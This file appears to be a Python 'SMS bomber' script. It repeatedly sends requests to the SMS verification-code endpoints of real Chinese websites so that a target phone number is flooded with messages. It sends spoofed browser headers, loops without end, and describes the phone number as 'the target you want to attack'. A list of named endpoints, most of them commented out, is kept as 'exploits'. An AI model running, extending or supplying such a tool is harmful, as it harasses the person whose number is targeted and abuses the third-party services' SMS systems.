#!/usr/bin/python3

#MIT License
#
#Copyright (c) 2019 Blume
#
#Permission is hereby granted, free of charge, to any person obtaining a copy
#of this software and associated documentation files (the 'Software'), to deal
#in the Software without restriction, including without limitation the rights
#to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
#copies of the Software, and to permit persons to whom the Software is
#furnished to do so, subject to the following conditions:
#
#The above copyright notice and this permission notice shall be included in all
#copies or substantial portions of the Software.
#
#THE SOFTWARE IS PROVIDED 'AS IS', WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
#IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
#FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
#AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
#LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
#OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
#SOFTWARE.

import sys, requests, time

fake_headers = {
    "User-Agent" : "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Safari/537.36"
}

def getTickCount():
    return int(round(time.time() * 1000))

def keyboardInterruptExit():
    print("\nThe mission has been canceled.")
    exit()

class CExploit():
    def __init__(self, name, url, delay, post_or_get, data):
        self.name = str(name) 
        self.url = str(url) 
        self.delay = int(delay) 
        self.post_or_get = bool(post_or_get) #post is true whereas get is false
        self.data = data #can be json or parameters
        self.last_send = 0

    def setMobile(self, pmobile):
        if self.post_or_get:
            for i in self.data:
                if type(self.data[i]) == str: #is string
                    if self.data[i] == "__MOBILE":
                        self.data[i] = str(pmobile)
        else:
            if type(self.data) == str:
                self.data = self.data.replace("__MOBILE", str(pmobile)) #it"s for get

    def perform(self):
        try:
            if self.post_or_get:
                r = requests.post(self.url, data=self.data, headers=fake_headers)
                print(r.text)
                #print(r.status_code)
            else:
                #print(self.url + self.data)
                r = requests.get(self.url + self.data, headers=fake_headers)
                print(r.text)
                #print(r.status_code)
        except KeyboardInterrupt:
            keyboardInterruptExit()
        except:
            print("Failed to call \"%s\"" % (self.name))

exploits = [
    #------USEFUL------
    CExploit("OCQ云智能管理", "http://app.imocq.com/login/registerInMobilePhone", 60, True, {"emailMobilePhone":"__MOBILE"}),
    CExploit("四川省特种设备考试机构报名系统", "http://t.scasei.org.cn/ajax/send-mobile-code", 30, True, {"mobile":"__MOBILE", "usage":"register"}),
    #------USEFUL------
    
    #CExploit("大V店", "http://s.davdian.com/index.php?c=sms&a=send", 60, True, {"mobile":"__MOBILE"}),
    #CExploit("Dfv", "http://www.defuv.com/index.php/Ajax/send_msg", 60, False, "?mobile=__MOBILE"),
    #CExploit("迪卡侬", "https://www.decathlon.com.cn/zh/ajax/rest/model/atg/userprofiling/ProfileActor/send-mobile-verification-code", 30, True, {"countryCode":"CN","mobile":"__MOBILE"}),
    #CExploit("潇x书院", "https://www.xxsy.net/Reg/Actions", 120, True, {"method":"sms", "mobile":"__MOBILE", "uname":"__MOBILE", "imgcode":"", "token":"0a33fad857c24e16640c4f2b18feaa97"}),

    #########由于某种未知原因无法使用
    #CExploit("私募排排网", "https://fof.simuwang.com/index.php?c=Login&a=getRegisterPhoneCode", 60, False, "&phone=__MOBILE"),
    #CExploit("超级简历", "https://www.wondercv.com/verify_tokens/phone", 60, True, {"phone_number":"__MOBILE"}),
    #CExploit("和讯", "https://reg.hexun.com/ajax/login_ajax.aspx", 60, True, {"mobile":"__MOBILE", "verifycode":"", "act": "sendsms_login"}),
    #CExploit("华图在线", "http://api.huatu.com/lumenapi/v4/common/message/send_by_java", 60, False, "?mobile=__MOBILE"),
    #CExploit("快速注册通道", "http://j.seo691.com/register/getverify.html", 90, False, "?reg_mobile=__MOBILE"),
    #########
]

if len(sys.argv) < 2:
    print("""usage: [phone-number] [delay]
        phone-number --- The target you want to attack.
        delay        --- Millisecond, to slow the script down instead of done all performance at time.""")

    print("The script currently has a total of %d exploits. (You can open & edit the script for adding more)" % (len(exploits)))

    exit()

target = sys.argv[1]
delay  = sys.argv[2]

for i in range(len(exploits)):
    exploits[i].setMobile(int(target))

last_send = 0

try:
    while(True):
        for i in range(len(exploits)):
            if (getTickCount() - last_send) > 1000:
                if (getTickCount() - exploits[i].last_send) > exploits[i].delay:
                    exploits[i].perform()
                    last_send = exploits[i].ticks = getTickCount()

except KeyboardInterrupt:
    keyboardInterruptExit()
